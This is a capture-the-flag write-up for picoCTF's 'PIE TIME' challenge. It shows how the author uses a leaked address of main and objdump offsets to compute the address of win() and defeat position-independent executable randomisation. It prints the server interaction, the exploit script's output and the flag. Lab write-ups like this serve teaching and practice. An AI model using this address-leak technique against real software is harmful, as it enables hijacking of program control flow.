# PIE TIME

When I connect to the server, I get the address of the main function.
```
$ nc rescued-float.picoctf.net 58266
Address of main: 0x61c69872b33d
Enter the address to jump to, ex => 0x12345:
```

In order to get the flag, I need to call the `win()` function. I need to calculate the address of the `win()` function based on the main address which the server leaks.

So the address of the `win()` function can be calculated as `main_addr - 0x133d + 0x12a7`.
```
$ objdump -d vuln
...
00000000000012a7 <win>:
...
...
000000000000133d <main>:
...
```

```
$ python exploit_new.py 
[+] Opening connection to rescued-float.picoctf.net on port 58266: Done
[*] Received: Address of main: 0x650884fe833d
[*] Main address: 0x650884fe833d
[*] Win address: 0x650884fe82a7
[+] Receiving all data: Done (126B)
[*] Closed connection to rescued-float.picoctf.net port 58266
[*] Enter the address to jump to, ex => 0x12345: Your input: 650884fe82a7
    You won!
    picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_378c1259}
```